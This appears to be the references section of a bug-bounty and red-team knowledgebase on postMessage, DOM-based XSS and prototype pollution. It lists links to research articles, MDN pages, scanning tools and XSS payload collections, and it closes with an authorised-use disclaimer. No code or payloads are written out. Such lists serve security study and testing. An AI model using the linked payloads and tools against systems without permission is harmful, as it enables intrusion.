- https://portswigger.net/web-security/cross-site-scripting/dom-based
- https://portswigger.net/web-security/dom-based/open-redirection
- https://portswigger.net/research/postmessage-vulnerabilities
- https://portswigger.net/research/dom-based-angularjs-sandbox-escapes
- https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs
- https://portswigger.net/research/dom-clobbering-strikes-back
- https://portswigger.net/research/bypassing-csp-with-policy-injection
- https://portswigger.net/research/exploiting-xss-in-hidden-inputs-and-meta-tags

### MDN Web Docs
- https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage
- https://developer.mozilla.org/en-US/docs/Web/API/MessageEvent
- https://developer.mozilla.org/en-US/docs/Web/API/BroadcastChannel
- https://developer.mozilla.org/en-US/docs/Web/API/Window/message_event
- https://developer.mozilla.org/en-US/docs/Web/API/MessageChannel

### GitHub Resources
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/PostMessage%20Vulnerabilities
- https://github.com/fransr/postMessage-tracker
- https://github.com/yeswehack/pp-finder
- https://github.com/BlackFan/client-side-prototype-pollution
- https://github.com/GoogleChromeLabs/pp-debugger
- https://github.com/PortSwigger/dom-invader
- https://github.com/PortSwigger/template-injection-workshop
- https://github.com/projectdiscovery/nuclei-templates/tree/main/http/vulnerabilities
- https://github.com/projectdiscovery/nuclei
- https://github.com/projectdiscovery/katana
- https://github.com/projectdiscovery/subfinder
- https://github.com/projectdiscovery/interactsh

### Writeups & Methodologies
- https://book.hacktricks.wiki/en/pentesting-web/postmessage-vulnerabilities.html
- https://infosecwriteups.com/postmessage-vulnerabilities-exploitation-guide-3a5f1cbf5e7f
- https://medium.com/@filedescriptor/postmessage-vulnerabilities-dom-xss-and-origin-validation-bypasses-7c8d14b0b3f0

### Wordlists & Payloads
- https://github.com/danielmiessler/SecLists/tree/master/Fuzzing
- https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content
- https://github.com/payloadbox/xss-payload-list
- https://github.com/terjanq/Tiny-XSS-Payloads
- https://github.com/lutfumertceylan/top25-parameter

---

> **End of Document**
> 
> *This knowledgebase is designed for advanced bug bounty hunting, black-box testing, and red team operations. All techniques should only be used on systems you own or have explicit permission to test.*
